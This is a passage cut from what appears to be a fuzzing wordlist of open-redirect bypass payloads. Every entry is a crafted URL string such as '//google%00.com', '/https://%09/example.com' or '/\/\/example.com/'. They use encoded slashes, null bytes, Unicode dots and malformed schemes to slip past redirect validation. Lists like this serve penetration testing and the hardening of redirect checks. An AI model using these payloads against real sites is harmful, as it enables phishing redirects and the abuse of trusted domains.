  "//example.com/%2f%2e%2e",
  "//example.com/%2f..",
  "//example.com//",
  "//google%00.com",
  "//google%E3%80%82com",
  "//https:///example.com/%2e%2e",
  "//https://example.com/%2e%2e%2f",
  "//https://example.com//",
  "/<>//example.com",
  "/\\/\\/example.com/",
  "/\\/example.com/",
  "/example.com/%2f%2e%2e",
  "/http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
  "/http://example.com",
  "/http:/example.com",
  "/https:/%5cexample.com/",
  "/https://%09/example.com",
  "/https://%5cexample.com",
  "/https:///example.com/%2e%2e",
  "/https:///example.com/%2f%2e%2e",
  "/https://example.com",
  "/https://example.com/",
  "/https://example.com/%2e%2e",
  "/https://example.com/%2e%2e%2f",
  "/https://example.com/%2f%2e%2e",
  "/https://example.com/%2f..",
  "/https://example.com//",
  "/https:example.com",
]
